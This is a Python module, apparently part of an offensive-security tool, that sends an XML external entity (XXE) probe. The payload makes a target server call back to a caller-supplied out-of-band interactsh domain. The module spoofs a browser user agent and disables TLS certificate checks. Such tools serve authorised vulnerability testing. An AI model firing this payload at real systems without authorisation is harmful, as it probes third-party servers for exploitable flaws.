"""
Raw execution for xxe_probe: POSTs one fixed external-entity XML payload that
points at a caller-supplied interactsh OOB domain. Records the response status
and snippet only. No parsing here -- parse.py's job.
"""
from __future__ import annotations

from dataclasses import dataclass
from typing import Optional

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    requests = None

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Tradecraft/1.0"

XXE_PAYLOAD_TEMPLATE = (
    '<?xml version="1.0" encoding="UTF-8"?>\n'
    '<!DOCTYPE tradecraft [\n'
    '  <!ENTITY xxe SYSTEM "http://{oob_domain}/xxe-probe">\n'
    ']>\n'
    '<root>&xxe;</root>\n'
)


@dataclass
class RawXxeResult:
    target: str = ""
    oob_domain: str = ""
    status: Optional[int] = None
    body_snippet: str = ""
    error: Optional[str] = None


def execute(target: str, oob_domain: str, content_type: str = "application/xml", timeout: int = 10) -> RawXxeResult:
    if requests is None:
        return RawXxeResult(target=target, oob_domain=oob_domain, error="requests library not available")

    if not target or not target.strip():
        return RawXxeResult(target=target, oob_domain=oob_domain, error="target is required")
    if not oob_domain or not oob_domain.strip():
        return RawXxeResult(target=target, oob_domain=oob_domain, error="oob_domain is required")

    domain = oob_domain.strip()
    payload = XXE_PAYLOAD_TEMPLATE.format(oob_domain=domain)
    result = RawXxeResult(target=target.strip(), oob_domain=domain)
    try:
        resp = requests.post(
            target.strip(),
            data=payload.encode("utf-8"),
            headers={"Content-Type": content_type, "User-Agent": USER_AGENT},
            timeout=timeout,
            verify=False,
        )
    except requests.RequestException as exc:
        result.error = str(exc)
        return result

    result.status = resp.status_code
    result.body_snippet = resp.text[:500]
    return result
